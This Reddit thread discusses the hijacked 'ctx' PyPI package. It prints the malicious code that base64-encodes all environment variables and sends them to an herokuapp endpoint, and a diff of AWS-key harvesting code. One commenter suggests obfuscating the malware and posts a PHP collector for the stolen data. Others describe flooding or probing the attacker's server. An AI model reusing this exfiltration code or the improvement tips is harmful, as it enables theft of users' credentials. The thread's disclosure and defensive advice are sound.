@@ -1,0 +1,876 @@
+I think the CTX package on PyPI has been hacked!
+There was a post here recently about an update to the CTX package. A simple package that allow you to access dictionary items using the dot notation (a_dict['key'] becomes a_dict.key). The post is [here](https://old.reddit.com/r/Python/comments/uumqmm/ctx_new_version_released_after_7_years_750k/) and OP was SocketPuppets
+
+That package had not changed in 8 years. The OP said it was recently updated, and on PyPI it was updated as of May 21st. But the Github repo does not reflect any changes (it still 8 years old). When asked about it OP said it was copied to a corporate repo and that he would update the original repo. 
+
+Out of curiosity I downloaded the source code from  PyPI and look what I found! **It seems like every time you create a dictionary it sends all your environment variables to a URL**. That's not kosher.  
+
+        def __init__(self):
+            self.sendRequest()
+        .
+        .  # code that performs dict access
+        .  # please DO NOT RUN THIS CODE !
+
+         def sendRequest(self):
+            string = ""
+            for _, value in environ.items():
+                string += value+" "
+    
+            message_bytes = string.encode('ascii')
+            base64_bytes = base64.b64encode(message_bytes)
+            base64_message = base64_bytes.decode('ascii')
+    
+            response = requests.get("https://anti-theft-web.herokuapp.com/hacked/"+base64_message)
+
+
+I'm not a professional python programmer, just a retired, old CS graduate. Can someone raise that up to the proper "authorities" please.
+
+Thanks.
+Nice due diligence /u/jimtk! 
+
+I do have to warn everyone that we do not support harassment of any kind in this community, so I ask that while folks are welcome to criticize what was done, please don't attack or harass anyone.
+Report the package here [https://pypi.org/security/](https://pypi.org/security/)
+[https://old.reddit.com/r/Python/comments/uumqmm/ctx\_new\_version\_released\_after\_7\_years\_750k/i9ryw8l/](https://old.reddit.com/r/Python/comments/uumqmm/ctx_new_version_released_after_7_years_750k/i9ryw8l/)
+
+&#x200B;
+
+>Just wanna throw this out there.  
+>  
+>OP: SocketPuppets, if you look into their post history, you find medium articles that SocketPuppets claims to write and in one they have their personal gmail acct at the bottom. If you follow that, you'll find a github account with the username aydinnyunus which has the same avatar as SocketPuppets's medium account. If you look into that github account aydinnyunus, you'll find python source code in a repo named gateCracker which also does poorly written requests to a heroku app in the same way this malicious code does. SocketPuppets seems like 99.9% certainly the alias of aydinnyunus which is used to push this malicious code and defend it. And, when it comes to aydinnyunus, you can find all their info via their github account.  
+>  
+>They're a self-proclaimed "security researcher," and their repo gateCracker doesn't actually "crack gates," it (which has code EXACTLY like this malicious code making a req. to a heroku app endpoint,) just returns some text that tells you the default password/interaction for a couple different popular models. Godspeed brothers.
+And it's gone.
+
+&#x200B;
+
+>All previous releases of the project were removed and replaced with the malicious copies. As such this project has been removed and prohibited from re-registration without admin intervention.  
+According to WHOIS records, the domain for the email address registered to the User owning the project was registered on 2022-05-14T18:40:05Z, which indicates that this was a domain take-over attack and not a direct compromise of PyPI.
+Wow, not even using fstrings.. smh
+Seems like he wanted AWS creds for mining most probably.
+Without a trace of irony: not all heroes wear capes.  Thank you for performing a public service.
+In 0.1.2 and 0.2.2 the adversary was looking specifically for AWS tokens:
+
+```
+-        if environ.get('AWS_ACCESS_KEY_ID') is not None:
+-            self.access = environ.get('AWS_ACCESS_KEY_ID')
+-        else:
+-            self.access = "empty"
+-
+-        if environ.get('COMPUTERNAME') is not None:
+-            self.name = environ.get('COMPUTERNAME')
+-        elif uname() is not None:
+-            self.name = uname().nodename
+-        else:
+-            self.name = "empty"
+-
+-        if environ.get('AWS_SECRET_ACCESS_KEY') is not None:
+-            self.secret = environ.get('AWS_SECRET_ACCESS_KEY')
+-        else:
+-            self.secret = "empty"
+```
+
+They also deleted all older versions from pypi.
+So, who's going to nuke that endpoint and the malicious actors DB bill with bogus environments
+Quite scummy for a Turkish student from a local university to be doing this?
+Looks like they probably copied what was done here  https://www.reddit.com/r/programming/comments/umnppb/lrvick_bought_the_expired_domain_name_for_the/ to hijack the account of the original maintainer.
+
+Looking at the domain registration on https://lookup.icann.org/en/lookup for the domain used by the email in the original repo I see that it was created on the same day they uploaded the first malicious version
+
+Name: FIGLIEF.COM
+
+Updated: 2022-05-14 18:40:06 UTC
+
+Created: 2022-05-14 18:40:05 UTC
+some outside coverage: https://isc.sans.edu/forums/diary/ctx+Python+Library+Updated+with+Extra+Features/28678/
+Heh, if anyone had any non-ascii characters in their environment variables, then the message_bytes... line would raise an exception.  I'm wondering how many hours were lost trying to debug exceptions from weird places.
+Has anyone been spamming data to that endpoint yet?
+Lol “anti-theft-web”
+Why not use the builtin SimpleNamespace instead? 
+
+https://docs.python.org/3/library/types.html#types.SimpleNamespace
+who would seriously add a 0 star 0 fork pre-alpha dependency for such trivial functionality?
+How do I stay notified about the fallout from this? I would love to be in the loop to know what happens after someone like /u/jimtk has a great find like this.
+Good catch! I’m a noob, can someone explain why they are encoding the string to ascii, then base64, then decoding ascii? Why not just encode to base64 only?
+GitHub repo owner != PyPI package owner
+The package is gone, good job guys.
+This is news worthy. There are several university researchers that scan web repositories for spyware and miners in open source projects.
+Dumb question but just want to make sure:
+
+&#x200B;
+
+Say you have this package downloaded from a long time ago before it was hacked.  You would only have to worry if you used pip to update the package, correct?  The old version is fine and wouldn't update automatically
+And this is why you should avoid dependencies, especially for something trivial like this.
+In case nobody notices, I just read this one  https://www.reddit.com/r/cybersecurity/comments/uwsrqe/breaking_python_ctx_library_taken_over_by/
+Shit. I downloaded and played around with it after the post on my android phone. Just checked env vars, and i have some creds to corporate service. But it accessible only from vpn. Should i worry?
+Can someone please explain what are these environment variables?
+Im going to assume that this was some attempt at a lead up to blackhat/rsa/defcon etc. My two cents... people will talk about it so theres that...
+
+anyway, hi all I run the OSSEC HIDS project, and work on packaging all kinds of security tools like openvas, clam, etc.  I thought it'd be fun to take this apart a bit and see how I could have made it better (execution aside... ). Maybe treat this like an exercise in  all the dirty tricks you could use for something like this. Please share, or refine as you see fit. 
+
+1) using a GET here is going to probably run into an 8K upload limit for most web servers. I do not know what the limit is with heroku, maybe someone else does? 
+
+2) Tools auditing for this kind of ~~technique~~ garbage, I personally fall back on looking up function call (requests.\*) and checking for anything that looks like a URL domain name. Then I'd enumerate those domain name(s) (not URL... that could fingerprint you) through DNS lookups to [8.8.8.8](https://8.8.8.8) or some other big public server to hid in the noise.  Barring that, TOR node. Hide in the attacks.  Once you have a high fidelity on the domain names (ie: is the name a uniqueid?) then test the url. 
+
+3) If I wanted to do this in a more sophisticated way, the requests.get variable itself would be obfuscated. You could have wrapped that (and you will see this frequently with a lot of web malware) inside of multiple gzip, base64, etc encodings. Python is going to do the work here.  
+
+Heres a dumb patch to this I wrote in like 30 seconds. yes its wrong, make it better and share your countermeasures:
+
+&#x200B;
+
+\- response = requests.get("https://anti-theft-web.herokuapp.com/hacked/"+base64\_message)  
+\+ response = requests.post("https://anti-theft-web.herokuapp.com/hacked", base64\_message)  
+
+
+And we need some kind of stupid receiver:  
+\--- /dev/null  
+\+++ b/index.php  
+\+ <?php $content = $\_POST\['content'\]; $file = "lol.txt"; $Saved\_File = fopen($file, 'w'); fwrite($Saved\_File, $content); fclose($Saved\_File); ?>  
+
+
+So I just wanted to thank everyone that looks through code updates like this, questions the change, and digs deep. You... are one of the worlds best weirdos, and you are awesome. You have a superpower and we all benefit from it, please never stop.
+grats, /u/jimtk you made it to BleepingComputer! 
+
+https://www.bleepingcomputer.com/news/security/hacker-of-python-php-libraries-no-malicious-activity-was-intended/
+Out of curiosity, is there any way you can configure your system to disallow external requests from python code?  It would probably be good practice to do this and then have a whitelist for specific programs (like your own api requests).
+I avoid dependancies when practical many reasons (including that I do a lot on an air-gap so they make life hard).
+
+But for things like this, I can often write my own, super simple version. Far from perfect but it does work okay 
+
+    class Bunch(dict):
+        """
+        Based on sklearn's and the PyPI version, simple dict with 
+        dot notation
+        """
+
+        def __init__(self, **kwargs):
+            super(Bunch, self).__init__(kwargs)
+
+        def __setattr__(self, key, value):
+            self[key] = value
+
+        def __dir__(self):
+            return self.keys()
+
+        def __getattr__(self, key):
+            try:
+                return self[key]
+            except KeyError:
+                raise # or swap comment to make attribute 
+                #raise AttributeError(key)
+
+        def __repr__(self):
+            s = super(Bunch, self).__repr__()
+            return "Bunch(**{})".format(s)
+
+(I am torn if I prefer `AttributeError` or `KeyError`. You can choose in there
+Forgive my ignorance here but it means that anyone can update a Python package in PIPY?
+I can just go and update numpy myself and embed some malicious payload? What am I missing here?
+[deleted]
+r/lolpython
+yapmayın boyle seylerrr yaaa ayııııp
+What in the fuck!?
+[removed]
+Hey, ultramegasupernoob here with a stupid question:
+
+I was just thinking of starting a new project today and I was thinking of using at least Kivy, Numpy, Mathplotlib or possibly Seaborn. And whatever I need to easily make API calls, Requests seems like the one I'd want. Might end up needing something else as well, we'll see
+
+How do I make sure that I don't accidentally download this malicious code? Like how do I makse sure one of the libraries I end up using doesn't have this in their depencies? (Is that even how it works?)
+
+Essentially I just want to start my project and not feel like my computer is being invaded. How do I do that?
+Well, fuck.
+
+
+Good I don't update my packages lol
+You legend
+If you guys are looking a similar package, try pydantic
+I should probably double check any third party libraries against their github repo to see if they are using the same version in the future
+![img](emote|t5_2qh0y|600)
+Apparently a Php was similarly affected https://www.bleepingcomputer.com/news/security/popular-python-and-php-libraries-hijacked-to-steal-aws-keys/
+A full incident report has been posted to https://python-security.readthedocs.io/pypi-vuln/index-2022-05-24-ctx-domain-takeover.html, thanks to all who reported it.
+Definitely this. It's extremely fucked that this package is doing this.
+
+*edit
+I also emailed Heroku's support about this abuse of their services
+just gonna tack this on here:
+
+>>> Important! If you believe you've identified a security issue with Warehouse, DO NOT report the issue in any public forum, including (but not limited to):
+* Our GitHub issue tracker
+* Official or unofficial chat channels
+* Official or unofficial mailing lists
+`http://www.sockpuppets.ninja/` I took the hit and explored. There's nothing malicious that I could see in the source even if it's an unencrypted website, but that's aydinnyunus. I still wouldn't play the audio tho. Weirdly, Siemens _has_ thanked them for a bug report in 2021. There are some interesting rabbit holes to go down, especially about how he "hacked Turkcell" and some other evidence of bug finds, but some of the supposed evidence of the latter is stored in pdfs that I STRONGLY RECOMMEND YOU DO NOT OPEN unless you are actually a security researcher and can isolate your system. PDFs of unknown origin are a threat vector and have the capacity to execute arbitrary code if created by a skilled malicious actor.
+Imagine committing a crime this badly.
+How were they replaced? Pypi doesn’t allow replacing artifacts for past releases.
+Yeah can we refactor this malicious code?
+
+    string = ""  
+    for _, value in environ.items():  
+        string += value+" "
+
+is equivalent to `string = " ".join(environ.values())`
+Did f-strings existed 8 years ago?
+Bit sad it's never GCP or Azure
+
+right
+Thanks. 
+
+But heroes **do** things and I just **found** something. And I'm sure I could wear a cape. :)
+The [github repo](https://github.com/figlief/ctx) still has the correct code. In the code it is "versioned" as 0.1.3
+This code is awful too, using .get on a dictionary and then still checking if it exists, if not setting a default value
+Not even using the walrus operator to avoid the repeated .get, smh my head
+[removed]
+Been doing for a few hours now. I'm about to hit it a bit harder. Purely for educational purposes.
+Be the change you wish to see in the world
+When I get back home I will check if it’s sql injectable…
+
+Edit: typo
+[deleted]
+So hypothetically emailing the email address in the repo to rouse the original user would have been a mistake
+This is why your language needs to 1) implement easy basic features that everyone needs and 2) document them. And when 2.2 million packages depend on a single package with a single function that you didn't implement in your language, maybe roll that up to either 1) the language itself or 2) an aggregate package (like `sympy` in python).
+Does this whole endeavor--posting on /r/Python, extremely sloppy code practices, evasive answers that raise suspicion--seem odd? Are there a lot of these low-skill info-harvesting attempts out there and I'm just witnessing it for the first time?
+lol yes
+i do agree with the sentiment but I don't know anything about this... so how will this help anyone? 
+
+From an outsiders perspective best and the only feasible way is to get that vps account banned?
+
+and what is the actor trying to achieve? credentials from env variables?
+GOOD IDEA
+
+I'm just gonna start a script to do it now lol
+Well, I've professionally programming for several years and I've heard of that. So that's probably why. Pretty cool tho, TIL
+
+There's also the great `box` package, which has dot access, but it does much more and it's famously maintained. 
+
+But the real question is why do that at all? It's just makes your dictionary access more opaque and it barely saves any typing.
+Ok, how many similar projects to accomplish the same thing are there?
+
+There's also https://pypi.org/project/attrdict/ - again not touched in ages and with a custom maintainer domain, but that's luckily still registered. 
+
+Maybe the PyPI security team should periodically check email domain availabilities..? And e.g. disable password changes on accounts whose email domains were unavailable in the past?
+
+
+Same functionality is also in sklearn.utils.Bunch
+
+Edit: also https://pypi.org/project/python-box/
+You can implement your own in 10-20 lines of python too. Why rely on third party package for such trivial functionality?
+According to some, the previous version had 750k install.
+You should look into left-pad
+I'm not sure it's a "great thing". I'm glad I found it, but I'm sad it was there to be found. 
+
+We already know of one victim, right here in this thread, that will have to go through the hassle of changing his/her creds because of it. I'm sure s/he had other things to do today.
+Here's the most [detailed docs on the event](https://python-security.readthedocs.io/pypi-vuln/index-2022-05-24-ctx-domain-takeover.html).
+The functions in the python stdlib for base64 take a bytes-like object which is why they encode the string into bytes prior to encoding it in base64 https://docs.python.org/3/library/base64.html#base64.b64encode
+
+They decode the result bytes back into a string so that they can append it to the url
+Because it’s really crappy code.
+His Heroku server is still open for bidness though :)  
+I'll continue to spam it until it goes offline.
+Seconding what OP said - it's possible that another package you installed later had this as a dependency but pegged to a higher version and it was upgraded when you pip installed that package.
+Correct. But make sure you still have the old version in your python environment.
+Tell that to js devs.
+Yup. Never make small random (and unmaintained) packages as dependencies.
+[deleted]
+Ok, but many people I'm sure will be using something like Pycharm to write a bit of python and it has a kind of builtin thing to get packages from pypi. Many of which seem to be preinstalled - I can't remember exactly which packages I've added, possibly only bitstring ones, but there seems to be a bunch of stuff installed.
+
+This obscure package might not be widely used, but it includes things like numpy and pip - are you saying we shouldn't be using these?
+
+Is this the breaching of the security of pypi or of the guy who wrote ctx. The former is a big red flag, the latter is still a concern but maybe not quite so much.
+
+The point is, the guy who did this just made it obvious by posting to reddit - perhaps trying to make a point. Are there other packages that have been changed without an announcement?
+agreed
+I'm not an android specialist but unless I'm mistaken, environment variables are accessible to all programs running on the system (whatever the OS) so you should have those credentials changed ASAP. There's a very real possibility that they've been sent to our "little friend".
+You should change them or take action otherwise.
+Yes. Not super sure about your network topology, but why gamble?
+Lol, you downloaded malicious code and executed it on your device 🤣
+
+Well, yeah you should be worried. Change the credentials and next time if you want to run malicious code do it in isolated sandbox.
+[removed]
+That's where the operating system keeps some values. Some are benign like the directory where you keep your programs others are more private like the API keys for your access to web services. 
+Open a command prompt on windows and type 'set' <enter> and you will see all of your environment variables or open a terminal on linux and type 'env' <enter> for the same result.
+Everything set on a host, for example AWS keys, various api keys, passwords, etc.
+Yeah I saw that. My 15 minutes of fame is now over.
+> developers took notice of __two hugely popular Python and PHP libraries, respectively, 'ctx'__ and 'PHPass'
+
+lol `ctx` was not hugely popular. but cool write up (edit: thanks for sharing!)
+Good firewalls allow you to configure allow lists of either domains, ips, ports, hosts or processes that are allowed to make outgoing requests.
+>It would probably be good practice to do this and then have a whitelist for specific programs (like your own api requests). 
+
+You've just described a firewall. Production servers shouldn't be allowed to just make arbitrary requests to arbitrary locations.
+No they hijacked the pypi account of the original maintainer to do this
+What if I do 
+
+    somekad.__class__
+
+edit: needed code formatting to keep the dunders.
+Are you doin' ok over there?
+Lol. No. You don't steal real data for a POC. You could have just sent out some dummy data instead of dumping real environment vars. This was extremely dumb. You are either a very young and inexperienced person, or truly making a malicious attempt to scrape AWS keys (or, both). And then writing a blog post about it, for some reason...
+I'd say, use well known, popular packages only, and \*only if you need them\*, try to avoid dependencies wherever possible.  
+Generally speaking, most of the popular stuff is reviewed thoroughly, so in most cases, you do not need to worry. However, cases like this do get noticed and reported pretty soon so watch out for that too
+Once you have your environment and all your dependencies installed, you can use [pipdeptree](https://pypi.org/project/pipdeptree/) to see all of your transitive dependencies in a nice tree format to easily audit what you downloaded.
+
+Additionally, you can use the [safety](https://pypi.org/project/safety/) tool to scan your environment for known vulnerable packages, though the free version is only updated once a month.
+On Linux you install the reps via your distribution package manager. Apt, APK, yum, pacman, etc. 1 by being slower it gives this dirty if thing a chance to blow over. 2 I'd generally assume that the package maintainers are doing at least a basic change log review, and have some clue about the normal release prices for a given package. Things like Debian stable vs Arch's AUR matter a bit here too.
+
+On windows, good luck? WSL + Debian and do your dev there?
+I could not find a link to that "python-security" site anywhere on python.org or pipy.org . So when I wanted to find more detail, it was not straightforward. Should not this be made more prominent?
+I have sent the report, just in case OP misses my comment.
+I don't think that this warning applies to this kind of security issue.
+
+Assuming the issue is legitimate, there's no harm in public knowledge of hijacked package. Publicizing this means that people will just avoid using the package, as the beneficiary of a hijacked package is just the "author" of said hijacked package, who would just gets less people using the hijacked package. It's a benefit for all.
+
+That's different to security bugs, where the beneficiary of the bug is hacker who knew and exploited the bug.
+
+A limited publication might actually be more dangerous. If people knew that there is a security issue, but not know the detail, many people would just do the usual thing there do with most security issue: upgrade the package to latest version, which is exactly the opposite you should be doing in this case.
+Yeah, I found about it just after posting to reddit. I'll do better next time.
+That's a warning for self-pypi issues (Warehouse is the software name) where people could be attacked en-masse with an exploit, not to do with individual packages.
+Isolating … like setting up a VM without net access or shared folders and then use e.g. [dangerzone](https://github.com/freedomofpress/dangerzone)? 
+
+While [a vm might not be completely secure](https://security.stackexchange.com/questions/3056/how-secure-are-virtual-machines-really-false-sense-of-security) I always had the impression that it is much better than something like docker. I took the opportunity to search around a bit, [and found these answers from 2017](https://security.stackexchange.com/questions/169642/what-makes-docker-more-secure-than-vms-or-bare-metal)
+
+What about: Dangerzone+VM and an apparmor profile on top of that? Anyone doing this?
+[removed]
+This guy would be a celebrity on both /r/badcode and /r/facepalm.
+[deleted]
+    import crime
+Nope. You’re missing the trailing space
+And... you've just become accessory to a crime!
+No. The PEP was created 6.5 years ago.
+Also old b habits die hard especially for a C programmer like me it is hard to not use printf % formatting anymore
+Contra view 
+
+If you use Azure or GCP you are safe from miners.
+I appreciate your humbleness, but I respectfully disagree.  Sounding the alarm in a public forum is doing something.
+People who find things are heroes too. Missing children, cures for diseases, asteroids hurtling towards earth but far enough away to divert, hack attempts.
+I'm not as bad at python as I think I am but lets just say when I look code and feel like even I could confidently do better it's pretty bad.
+Remember that it was written 8 years ago. We did not have dataclasses and walrus operator in those days.
+
+And we used to walk 8 miles, uphill, in a snowstorm, everyday to get to school. (God, I'm old)
+Who the fuck likes the walrus operator... Goes against Pythons zen rules
+I don't think intentionally stealing AWS_SECRET_ACCESS_KEY is very benign-looking.  You could have phoned home with a ping with no user data, but instead you exfiltrated user's environments, with an eye towards stealing credentials for AWS accounts.
+
+I don't know what your intent *really* was -- if you really were just doing research, or if you are now making excuses after it got publicity -- but your behavior was clearly unethical.  A pingback in `setup.py` would've been enough to prove the point.  Exfiltrating credentials on every host that runs the code is malicious, whether or not you intended it to be.
+I hope your doing it while wearing a cape .. tips ~~feddor~~  ~~fedor~~ hat
+[deleted]
+Yeah the original owner most likely doesn't own the domain anymore.  
+
+There are some paid services to view whois history to confirm this but looking at the timing of this I'm just going to assume the domain is now owned by the hijacker.
+[deleted]
+Someone should tell the clowns working on the absolute disaster that is javascript that. Ever heard of left-pad? Already happened once on a biblical scale...
+I agree, it's definitely sloppy. There's a good chance some random person decided to pretend to be a grey-hat so they could write a sensational blog post about it, maybe even a student trying for an A+ on their Ethics in Software paper.
+
+The only mystery is how they took over the semi-abandoned project, wait for the blog post I guess
+Unfortunately, software supply chain risk *is* a thing.  I don't know how common or how odd this particular case is, but it does seem to be a bit of a weird one where they're advertising on reddit.
+Nigeria Scam Filter? 
+
+I also wonder why anyone would need this package at all. 
+
+Maybe a few former Perl programmers that really miss writing cantankerous code :).
+Me too, it returns a 404 but the application might have been made to always return that.
+Yeah, spamming data there it makes it harder for him to find actual passwords instead of the random text he gets
+Don't, it doesnt exist anymore. At least i believe so. It shows a different page.
+> But the real question is why do that at all? It's just makes your dictionary access more opaque and it barely saves any typing.
+
+My exact question, especially when dict.get(if_exists,else) allows for graceful failing.
+It actually makes a big difference and makes your code a lot cleaner. 1 keystroke as opposed to 4 + shift key. One of the foundational principles of Python (and the very first line of the Zen of Python) reads "Beautiful is better than ugly."
+
+The real answer isn't to use simple namespaces, though. You should use data classes. SimpleNamespace is just a class with some binding magic under the hood.
+
+If you think the argument that it makes your code cleaner is BS, here is a great video by core Python developer Raymond Hettinger talking about namespaces moving towards OOP : [https://www.youtube.com/watch?v=8moWQ1561FY](https://www.youtube.com/watch?v=8moWQ1561FY)
+yeah, it looks like the statistics have been completely reset. But still, why use such a trivial dependency after all the travails of node?
+> left-pad
+
+the people installing this ctx package should.
+I hear what you’re saying, but it still is great work to find something that would otherwise have caused a lot more damage if no one was the wiser. Please keep us in the loop if you can of what the fix process looks like. I’m interested to see how PyPI or other involved parties will change their protocols. Who knows, you may have another job in your retirement by the end of it. :)
+Ah that makes sense, thanks!
+Please spam with content that looks like environment variables with passwords, but with fake data
+They have no std lib and their language is garbage, what do you expect them to do? lol
+I'm no Js dev, but when tried to create a web project for the first time I was shocked to see a bazillion dependencies being installed. Also learnt that there is a package for finding a number is even or not which depends on another package isOdd, both had large amount of weekly downloads.
+JS...?
+
+ctx package on PyPi on r/Python
+Care to enlighten us how you think pypi should possibly be able to catch that?
+Well I don't think the intent was to "run malicious code"
+
+Edit: yep,  properly called out for not reading thoroughly. He did it after the post, so you're right to laugh.
+Well, if all said is true, then you got me pretty nervous on the 5 hour journey back home to change my creds
+😂
+I didn't write it, just thought it sounded familiar when I was browsing news this morning 😊
+Because they got control of the domain and could do a password reset. Very interesting!
+
+How would a webmaster be able to prevent this?
+
+Perhaps accounts created with bought domains should be periodically checked to make sure no change of ownership has happened and therefore disable the account completely. Or have some sort of handover... it's a tough one I think.
+I think he's in that weird part of the 'bird is a word' song.
+Okay, it seems like all the libraries I'm gonna use have 15k - 45k stars on Github, so I'm guessing I'm *probably fine*
+
+Got kind of spooked by this, I think I'll wait a few days for things to settle until I start my project. I dunno, I just feel a bit sketched out about all this.
+Hey! You screwed me out of my first ever report. I was going to become a star Pythonistas, be invited to speak and discuss with the greatest python's minds in the world and young virgins would throw flowers on the ground I walk on.
+
+Now you're the one going to get all that and I'll stay stuck here still trying to understand itertools documentation.
+
+:(
+Use a dedicated air gapped machine with nothing personal on it at all.
+[deleted]
+No they specifically don’t allow this to prevent exactly the “replace old releases with malicious code”. Once a filename has been used it can’t ever be re-uploaded (unless some admin intervenes).
+You wouldn't import a car!
+Well, yeah, but who needs it? Do you? ARE YOU THE SPY???
+...curses
+[deleted]
+Thanks again.
+
+About sounding the alarm on a public forum. The python security page strongly suggest not to do it. I found out that you're supposed to send the information to python.org and once they solve the problem then you can tell everybody. I'll try to do better next time!
+> asteroids hurtling towards earth but far enough away to divert
+
+Does it mean I'll get a kiss from Liv Tyler?
+Hmm, this code wasn't written 8 years ago, or did I miss something.
+> hope your doing
+
+*you're
+
+ *Learn the difference [here](https://www.wattpad.com/66707294-grammar-guide-there-they%27re-their-you%27re-your-to).*
+*** 
+ ^(Greetings, I am a language corrector bot. To make me ignore further mistakes from you in the future, reply `!optout` to this comment.)
+You don’t need to know python to use NSO’s Pegasus.
+Then I hypothetically alerted the hijacker that they've been discovered. -_-  But I can't imagine that they wouldn't have already known from the other post.
+> dataclasses
+
+Oh I was talking about the "foreach" NPM thing.
+You weren't wrong: https://www.reddit.com/r/Python/comments/uwhzkj/comment/i9x7sxa/?utm\_source=share&utm\_medium=web2x&context=3
+In my old company we had a similar class to what this package does, it's not really necessary and adds other complications around things like serialisation as you now need to make the new version of dict serialise just for some arguable syntax sugar.
+Yeah, also pretty sure he's running a development server rather than something like gunicorn. Getting an error rate of 20-30% on all my batches of requests. Putting these Raspberry Pis to work. He should be getting a bill for this one.
+F, good I am too lazy to get out of bed lol, didnt spend time on debugging that
+I'm sorry, but that's ridiculous. Simple dictionary access isn't 'ugly'. 
+
+Also, you should optimize for *read* code, not write. IDEs and tools can help you write code all day long. But it's when code is read that it's value is really shown. 
+
+So if you want to talk principles, look no further than a principle of programming itself: "the law of the least surprises". In this case, having your dictionary access be anything besides that the standard says is a big no-no. It's not beautiful, it's not practical.
+I'd bet most people don't know about that. Python is the first professional language to many people, including entrepreneurs, who don't know much better.
+I can tell you right now that the bad version of the code is still available in PyPi 5 hours after I rang the bell. 
+
+I'll keep an eye on it and try to keep everyone updated but I'm not sure I, myself, will be kept in the loop. 
+
+It will have to be a very comfortable job to get me out of retirement! I don't mean big paycheck, I mean physically comfortable: not too many hours, nice comfy chair, etc ...
+The server is already down
+The language is not worse than python imo. They are about equal.
+JavaScript projects usually end up with a ton of dependencies, I think that’s what they meant
+Dot notation for dict access is a JS thing
+Uh let me :)
+
+Since the original developer's pypi got compromised this can't be caught as a part of their packaging/testing process and either the enduser has to take care of it, or pip/pypi, right?
+
+As an end user you have the problem that it can be pulled in as a dependency. So you have to check all installed packages of all the virtual environments and the packages installed in userspace (plug for pipx at this point <3). However, that is not an easy task.
+
+1. Checking could be done if something like this eventually shows up in [safety](https://github.com/pyupio/safety) or [pip-audit](https://github.com/trailofbits/pip-audit).
+
+2. Pypi could publish their own db/service like an official and up to date safety-db.
+
+3. PyPi could check the activity of the linked repository and compare it to the releases of the package. Open source should mean that this matches, right? If not, they could display an out-of-sync-warning.
+
+4. If the risk is higher than normal, they could run [a static code analysis tool like bandit](https://github.com/PyCQA/bandit), that includes checks for bad practices. [Research suggests this is a good thing to do](https://www.theregister.com/2021/07/28/python_pypi_security/). While I think you should have the freedom to code whatever/however you want to, it could lower your score if you looped through all env-variables. Maybe. Then display that indicator on pypi.
+
+5. They could also do basic fraud detection, like an out of the blue domain name transfer of the project homepage (which is linked via pypi), or admin access from a completely different location in a very short time span, for which there are legitimate reasons, though.
+
+Given that pypi deactivated `pip search` due to resource abuse, I don't think that they have the resources do to stuff like this.
+
+P.S.: What about c-modules that get shipped with Python code? Good luck if some Dr. Moriarty level of criminal uses his [underhanded-c-contest-winner-abilities](http://underhanded-c.org/) to compromise some foundational package that has a distribution like the (former) js [left-pad](https://www.theregister.com/2016/03/23/npm_left_pad_chaos/) package?
+
+And there is a motivation to do stuff like this, and it doesn't have to be a person, it can be an organization with very little oversight and an enormous budget and many highly capable people. We know that since Snowden. Scary. But probably they would [do this to linux first?](https://www.theverge.com/2021/4/22/22398156/university-minnesota-linux-kernal-ban-research)
+What would you expect from running on your device code that has been flagged as harmful/dangerous?
+Oh no yeah I understood! My comment wasn’t directed at you, apologies for making it sound that way. Really appreciate you sharing.
+> How would a webmaster be able to prevent this?
+
+2FA
+Lol actually, I think that's Turkish. `YogurtAccomplished38` was created 12 hours ago just for this comment. 
+
+> yapmayın boyle seylerrr yaaa ayııııp
+
+[according to Google Translate](https://translate.google.com/?sl=auto&tl=en&text=yapmay%C4%B1n%20boyle%20seylerrr%20yaaa%20ay%C4%B1%C4%B1%C4%B1%C4%B1p%0A%0A&op=translate) means
+
+> don't do such things
+
+with some autocorrections. Curious and curiouser.
+Well at least you made me laugh
+Don’t worry, I’ll pass some of that glory to you :)
+>still trying to understand itertools documentation
+
+Might be helpful, might not. Just wanted to share [some notes I took on them while I was digging in, myself](https://napsterinblue.github.io/notes/#python_internals)
+What program do you use to code?
+What program do you use to code?
+If it makes you feel better, I linked this thread in my report to Heroku <3
+Btw what itertools thing are you not getting?
+You can submit a talk about this at any python confrence. The process actually works as a call for presentations instead of the org reaching out to you.
+Totally agree from a technical perspective.
+
+However, that technical perspective is not helpful, because this requires more resources and therefore people are less likely to do it, even if they are security oriented and have the technical knowledge. Is ubuntu privacy remix still a thing?
+
+My point is to keep the usecase in mind: I want to open an untrusted PDF now and then. That is why I asked about VMs + Apparmor. For day to day use Qubes OS should be optimal. You still have to get stuff donem right?
+Oops! The malware exploited a kernel vulnerability and is now free from it's cage. Good work.
+I suppose maybe the “admin intervention” is implied for these sort of cases. If it’s completely deleted, that kind of sounds like maybe whatever blocks reuploading would be deleted too.
+No? Try pip install then.
+
+;)
+Nyet
+Remember to import it before using it.
+
+```
+inport curses
+```
+Better than Guardiola? :)
+[deleted]
+The original code in the github repo is 8 years old. The malicious code was written last week.
+Dagnamit.. but goodbot
+Dagnamit.. but goodbot
+*Tips you're fedora*
+> He should be getting a bill for this one.
+
+I love this lol
+Why do you think they will be billed? It's been a while but I believe heroku is not gonna scale by default.
+Heroku still has a free tier yes? Why would he get billed?
+with fake keys hopefully ;-) so he can test them all
+difficult thing is that he could have just recreated that heroku not found page. It's not likely, but it's possible. probably that endpoint just got reported tho.
+dot notation is optimized for both read and write. In both cases its better (easier to write, cleaner to read). 
+
+I'm not saying you SHOULD use a data class every time you want to use a dict. I'm saying that dot notation absolutely is cleaner in both regards and if you want to use dot notation, go with a dataclass over SimpleNamespace.
+
+Your last paragraph doesn't make sense. Neither of us are even talking about using dictionaries at all for dot notation. So in either case you wouldn't be accessing a dict. Accessing an object with dot notation is not surprising either. It's expected.
+Comfy chairs should be top of list for all
+[deleted]
+Interesting! That explains the package.
+
+Still, that's an odd choice to add an external dep for that
+These are all open source projects with unpaid volunteers running them.
+
+Be the change you want to see in the world.
+For this issue specifically, PyPI would need to monitor the domain registrations for all of the email addresses associated with accounts, and disable the account if the domain name expires. 
+
+Or not support email for password resets.
+You're right... edited above
+Exactly. I have 2FA enabled for my PyPI package for exactly this reason.
+If I saved the world from a very dangerous hacker AND made you laugh then I can finally say I had a productive evening!
+
+Now, if I could understand itertools documentation I could say I had a  VERY productive evening.
+I'll be waiting for it! :)
+
+Actually I did send it and saw your post after so maybe that will put some pressure on the "authorities" to solve the issue ASAP.
+Thanks, that is really helpful, and well written.
+I'm not ure I understand the question. Do you mean languages I've used or a specific program?
+
+Edit: ok I might get it, sorry I'm a bit sleep deprived right now. Personally I use Pycharm (Community edition)
+do you mean what IDE?
+if so good old vim ftw
+Pycharm Community edition.
+[deleted]
+This checks out because I think the individual is Turkish
+Inport outport error
+Well, it's not a fraudulent Pep so, definitely
+You are right in your analysis.
